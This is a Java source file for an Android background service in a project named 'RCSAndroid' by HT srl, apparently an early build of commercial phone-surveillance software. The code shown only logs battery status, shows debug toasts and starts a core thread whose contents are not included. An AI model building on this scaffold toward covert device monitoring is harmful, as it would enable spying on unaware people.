/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

public class RCSAndroid extends Service {
	private CoreThread core;
	BroadcastReceiver batteryReceiver;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();

		registerListeners();
		Toast.makeText(this, "Que - Service Created", Toast.LENGTH_LONG).show();
		
		
	}

	private void registerListeners() {
		registerBattery();
	}

	private void registerBattery() {
		batteryReceiver = new BroadcastReceiver() {
	        int scale = -1;
	        int level = -1;
	        int voltage = -1;
	        int temp = -1;
	        public void onReceive(Context context, Intent intent) {
	            level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
	            scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
	            temp = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);
	            voltage = intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1);
	            Log.i("BatteryManager", "level is "+level+"/"+scale+", temp is "+temp+", voltage is "+voltage);
	        }
	    };
	    IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
	    registerReceiver(batteryReceiver, filter);
	}
	
	private void UnregisterListeners() {
		unregisterReceiver(batteryReceiver);
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
			
		Toast.makeText(this, "Que - Stopping thread", Toast.LENGTH_LONG).show();
		
		UnregisterListeners();
		
		// Core stops
		core.Stop();
		core = null;
		
		Toast.makeText(this, "Que - Service Destroyed", Toast.LENGTH_LONG).show();
	}



	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);

		Toast.makeText(this, "Que - Service Started, starting thread", Toast.LENGTH_LONG).show();
	
		core = new CoreThread();
		
		// Core starts
		core.Start(this.getResources(), getContentResolver());
	}
}

